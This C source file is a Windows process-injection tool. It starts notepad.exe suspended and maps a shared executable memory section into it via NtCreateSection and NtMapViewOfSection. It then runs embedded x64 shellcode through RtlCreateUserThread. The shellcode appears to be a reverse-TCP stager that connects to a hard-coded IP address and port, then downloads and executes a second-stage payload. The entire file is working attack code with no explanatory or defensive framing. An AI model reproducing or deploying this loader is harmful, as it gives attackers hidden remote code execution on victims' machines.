#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    ULONG InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PSIZE_T StackReserved,
    PSIZE_T StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PCLIENT_ID ClientId
);

unsigned char payload[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x51\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
    "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
    "\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
    "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
    "\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x50\x49"
    "\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
    "\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
    "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
    "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
    "\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
    "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
    "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
    "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
    "\x89\xe5\x49\xbc\x02\x00\x13\xba\x0a\xfa\x11\xc0\x41\x54"
    "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
    "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
    "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
    "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
    "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
    "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
    "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
    "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
    "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
    "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
    "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
    "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
    "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
    "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
    "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
    "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
    "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
    "\xf0\xb5\xa2\x56\xff\xd5";

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOA);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] ntdll.dll not found!\n");
        return -1;
    }

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread"); 

    if (!NtCreateSection || !NtMapViewOfSection || !RtlCreateUserThread) {
        printf("[-] Native API address not found!\n");
        return -1;
    }

    if (!CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessA Failed! Error: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Target process created in SUSPENDED mode. PID: %lu\n", pi.dwProcessId);

    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = 4096;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        printf("[-] NtCreateSection Error: 0x%08X\n", status);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }
    printf("[+] Section Object created. Handle: %p\n", hSection);

    PVOID localBaseAddress = NULL;
    SIZE_T localViewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &localBaseAddress,
        0, 0, NULL, &localViewSize,
        2, 0,
        PAGE_READWRITE
    );

    if (status != STATUS_SUCCESS) {
        printf("[-] Local NtMapViewOfSection Error: 0x%08X\n", status);
        CloseHandle(hSection);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }
    printf("[+] Local Map Address: %p\n", localBaseAddress);

    SIZE_T payloadLen = sizeof(payload) - 1; 
    memcpy(localBaseAddress, payload, payloadLen);
    printf("[+] Payload written with memcpy (%zu byte).\n", payloadLen);

    PVOID remoteBaseAddress = NULL;
    SIZE_T remoteViewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        pi.hProcess, 
        &remoteBaseAddress,
        0, 0, NULL, &remoteViewSize,
        2, 0,
        PAGE_EXECUTE_READWRITE
    );

    if (status != STATUS_SUCCESS) {
        printf("[-] Remote NtMapViewOfSection Error: 0x%08X\n", status);
        CloseHandle(hSection);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }
    printf("[+] Remote Map Address (Mapped Memory): %p\n", remoteBaseAddress);

    HANDLE hThread = NULL;
    CLIENT_ID cid;

    status = RtlCreateUserThread(
        pi.hProcess, 
        NULL,
        FALSE,         
        0, 0, 0,
        remoteBaseAddress,  
        NULL,
        &hThread,
        &cid
    );

    if (status == STATUS_SUCCESS && hThread != NULL) {
        printf("[+] Remote Thread executed. Thread ID: %p\n", cid.UniqueThread);
        
        ResumeThread(pi.hThread);
        
        WaitForSingleObject(hThread, 2000); 
        CloseHandle(hThread);
    } else {
        printf("[-] RtlCreateUserThread Error: 0x%08X\n", status);
    }


    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hSection);

    getchar();

    return 0;
}